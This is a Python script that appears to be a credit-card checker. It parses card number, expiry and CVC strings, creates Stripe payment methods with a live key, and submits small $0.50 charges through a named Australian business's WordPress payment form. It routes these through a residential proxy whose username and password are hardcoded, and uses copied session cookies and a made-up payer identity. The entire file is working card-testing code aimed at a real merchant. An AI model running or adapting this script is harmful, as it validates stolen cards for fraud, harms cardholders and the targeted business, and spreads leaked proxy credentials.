import requests,re
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_37c42edc-zone-yg69:0265kxd56ii6"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fa737e82bd0%3B+stripe-js-v3%2Fa737e82bd0%3B+card-element&key=pk_live_51OGuVJJSlvu2pbvHUCSF90qKHbTOMFP7CwVkMup0r0NBY6YKj5F429W0ImCUyP1RaOJuiYC0FfVyFW1YzKHajgiA00nqN47tcP'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'nitroCachedPage': '0',
	    '_gcl_au': '1.1.66036949.1744749062',
	    '_ga': 'GA1.3.1070660164.1744749061',
	    '_gid': 'GA1.3.486536076.1744749064',
	    '_gat_UA-213518938-1': '1',
	    '_hjSessionUser_3158161': 'eyJpZCI6IjM5Y2Q1NzA5LWUzNDYtNThiZC1iYzYxLTdiNmU3MDhjN2Y3ZSIsImNyZWF0ZWQiOjE3NDQ3NDkwNjQ0NDMsImV4aXN0aW5nIjp0cnVlfQ==',
	    '_hjSession_3158161': 'eyJpZCI6IjEzZTMyMDM0LTM2NWUtNGE5YS04M2MxLWVjN2Q1ZDQ0MTgyMyIsImMiOjE3NDQ3NDkwNjQ0NDgsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
	    '_fbp': 'fb.2.1744749065247.45734606816285652',
	    '_ga_RNL9BQ376F': 'GS1.3.1744749065.1.0.1744749065.0.0.0',
	    'PHPSESSID': '3e34655be80b7d85850811c50f50e5e4',
	    '__stripe_mid': '69089077-5867-40f7-ae32-1064b8354e322a04b2',
	    '__stripe_sid': '73ef39f6-d0d9-451b-bfb6-fcbbf93497e08613e0',
	    '_ga_49Y935403S': 'GS1.1.1744749061.1.1.1744749113.0.0.0',
	    '_ga_4LWD5S7HLJ': 'GS1.1.1744749062.1.1.1744749113.0.0.0',
	}
	
	headers = {
	    'authority': 'www.floodrestorationaustralia.com.au',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'nitroCachedPage=0; _gcl_au=1.1.66036949.1744749062; _ga=GA1.3.1070660164.1744749061; _gid=GA1.3.486536076.1744749064; _gat_UA-213518938-1=1; _hjSessionUser_3158161=eyJpZCI6IjM5Y2Q1NzA5LWUzNDYtNThiZC1iYzYxLTdiNmU3MDhjN2Y3ZSIsImNyZWF0ZWQiOjE3NDQ3NDkwNjQ0NDMsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_3158161=eyJpZCI6IjEzZTMyMDM0LTM2NWUtNGE5YS04M2MxLWVjN2Q1ZDQ0MTgyMyIsImMiOjE3NDQ3NDkwNjQ0NDgsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _fbp=fb.2.1744749065247.45734606816285652; _ga_RNL9BQ376F=GS1.3.1744749065.1.0.1744749065.0.0.0; PHPSESSID=3e34655be80b7d85850811c50f50e5e4; __stripe_mid=69089077-5867-40f7-ae32-1064b8354e322a04b2; __stripe_sid=73ef39f6-d0d9-451b-bfb6-fcbbf93497e08613e0; _ga_49Y935403S=GS1.1.1744749061.1.1.1744749113.0.0.0; _ga_4LWD5S7HLJ=GS1.1.1744749062.1.1.1744749113.0.0.0',
	    'origin': 'https://www.floodrestorationaustralia.com.au',
	    'referer': 'https://www.floodrestorationaustralia.com.au/payments/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1744749114136',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=240208&_fluentform_4_fluentformnonce=e8d1f32881&_wp_http_referer=%2Fpayments%2F&numeric-field=1&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser22%40gmail.com&custom-payment-amount_2=0.50&custom-payment-amount_1=&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '4',
	}
	
	r2 = session.post(
	    'https://www.floodrestorationaustralia.com.au/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	result2 = r2.text
	return result2
	

